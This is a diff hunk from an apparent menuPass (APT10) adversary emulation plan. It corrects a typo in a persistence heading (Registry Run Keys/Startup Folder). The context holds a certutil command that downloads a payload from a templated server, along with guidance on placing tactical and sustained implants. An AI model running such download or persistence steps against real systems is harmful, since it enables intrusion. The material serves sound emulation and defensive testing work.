@@ -266,7 +266,7 @@ C:\Users\Victim> certutil.exe -urlcache -split -f https://www.#{payload_server.c
 
 menuPass actors are reported to have persisted both tactical and sustained malware.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup> <sup>[5](https://www.fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html)</sup> <sup>[11](https://blog.trendmicro.com/trendlabs-security-intelligence/chessmaster-cyber-espionage-campaign/)</sup> <sup>[25](https://fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-)</sup>  Tactical malware should be thought of as the "work horse."  It is the tool used to accomplish tactical objectives and is therefore, more likely to be detected.  menuPass is reported to have been deliberate in the deployment and persistence of sustained malware.  These implants were employed to facilitate long-term access to target environments.<sup>[11](https://blog.trendmicro.com/trendlabs-security-intelligence/chessmaster-cyber-espionage-campaign/)</sup>  Sustained malware was deployed to systems that afforded the ability to blend in, remain undetected, or facilitate access to a resource deemed essential.  Select your host for persistence carefully, and do not persist tactical and sustained implants on the same host.
 
-#### 9.A - Boot or Logon Autostart Execution: Registry Run Keys/Starup Folder ([T1547.001](https://attack.mitre.org/techniques/T1547/001/))
+#### 9.A - Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder ([T1547.001](https://attack.mitre.org/techniques/T1547/001/))
 
 Tactical Malware
 
